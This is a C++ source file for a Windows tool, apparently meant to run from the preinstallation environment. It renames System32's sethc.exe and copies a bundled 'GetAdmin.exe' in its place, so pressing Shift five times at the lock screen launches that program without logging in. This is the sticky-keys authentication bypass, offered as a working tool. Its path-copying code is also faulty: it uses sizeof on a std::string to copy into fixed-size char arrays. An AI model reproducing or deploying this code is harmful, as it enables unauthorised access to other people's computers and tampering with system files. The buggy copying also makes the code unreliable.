#include <iostream>
#include <Windows.h>
#include <winreg.h>
#include <algorithm>
#include <direct.h>
#define GetCurrentDir _getcwd
using namespace std;

string get_current_dir() {
	char buff[FILENAME_MAX]; //create string buffer to hold path
	GetCurrentDir(buff, FILENAME_MAX);
	string current_working_dir(buff);
	return current_working_dir;
}

wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

int main() {
	HKEY hKey;
	DWORD buffer;
	LONG result;
	unsigned long type = REG_DWORD, size = 1024;

	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\Setup", 0, KEY_READ, &hKey);
	if (result == ERROR_SUCCESS)
	{
		RegQueryValueEx(hKey, L"SystemSetupInProgress", NULL, &type, (LPBYTE)&buffer, &size);
		RegCloseKey(hKey);
		if (buffer != 1) {
			cout << "This application can only run in Windows Preinstallation Environment";
			int x;
			cin >> x;
			return 0;
		}
	}
	else {
		cout << "Something went wrong, please make sure I can access the Registry";
	}

	cout << "This application will do some changes to your system files, this included rename sethc.exe and adding some files so you could run the program by trying to active sticky key(So make sure you turned on the shortcut for sticky key), do you want to continue?[y/n]\n";
retry:
	string x;
	cin >> x;
	for_each(x.begin(), x.end(), [](char& c) {
		c = ::tolower(c);
		});
	if (x == "y") {
		cout << "Start copying files... Please do not exit or shutdown your PC. it will be quick!\n";
	}
	else if (x == "n") {
		cout << "OK, I will not make any changes then, feel free to exit!\n";
		int exit;
		cin >> exit;
		return 0;
	}
	else {
		cout << "That is Neither y(yes) or n(no), please retry\n";
		goto retry;
	}

	//Copy Files to system32(Only 64 bit machine only)
	wstring stemp = s2ws(get_current_dir() + "\\AccessAdmin.pdb");
	LPCWSTR path = stemp.c_str();

	string driveLe = "C";
recheck:
	//Rename file
	string renamePathS = driveLe + ":\\Windows\\System32\\sethc.exe";
	string renamePathS2 = driveLe + ":\\Windows\\System32\\sethc.old.exe";
	char renamePath1[29];
	char renamePath2[30];
	for (int x = 0; x < sizeof(renamePathS); x++) {
		renamePath1[x] = renamePathS[x];
	}
	for (int x = 0; x < sizeof(renamePathS2); x++) {
		renamePath2[x] = renamePathS2[x];
	}
	if (rename(renamePath1, renamePath2) != 0) {
		cout << "==============================" << endl << "Can't find sethc.exe, skipping it" << endl << "==============================" << endl;
	}
	else {
		cout << "==============================" << endl << "Renamed sethc.exe to sethc.old.exe" << endl << "==============================" << endl;
	}
	//copy File
	wstring movePath1 = s2ws(driveLe + ":\\Windows\\System32\\sethc.exe");
	BOOL check;
	check = CopyFile(
		L"GetAdmin.exe",
		movePath1.c_str(),
		false
	);
	if (check == false) {
		cout << "There is an error while copying the require files, please enter your System Drive Letter Manually. Error No: " << GetLastError() << endl;
		string i;
		cin >> i;
		driveLe = i;
		goto recheck;
	}

	cout << "Finish copying files, please press shift 5 times(active sticky key) when you reboot and see the lock screen to active the program! You can now exit\n";
	int finish;
	cin >> finish;
	return 0;
}